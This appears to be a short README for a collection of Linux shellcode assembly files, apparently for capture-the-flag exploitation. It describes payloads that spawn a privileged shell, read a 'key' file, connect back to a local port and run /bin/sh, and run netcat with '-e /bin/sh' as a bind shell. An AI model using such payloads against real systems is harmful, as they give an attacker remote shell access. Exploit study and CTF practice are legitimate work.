shellcodes-linux
================


**bash.asm**
execve("/bin/bash", ["/bin/bash", "-p"], NULL);

**sh.asm**
execve("/bin/sh", ["/bin/sh"], NULL);

**cat.asm**
execve("/bin/cat", ["/bin/cat", "key"], NULL);

**cat_syscall.asm**
cat "key", with read()/write() syscalls

**connectback.asm**
connect back to 127.0.0.1:4096 + execve "/bin/sh"

**connectback_ipv6.asm**
connect back to [::1]:4096 + execve "/bin/sh"

**ls_syscall.asm**
list "." directory with getdents() syscall

**nc.asm**
execve("/bin/nc", "/bin/nc", "-p", "4096", "-vve", "/bin/sh");
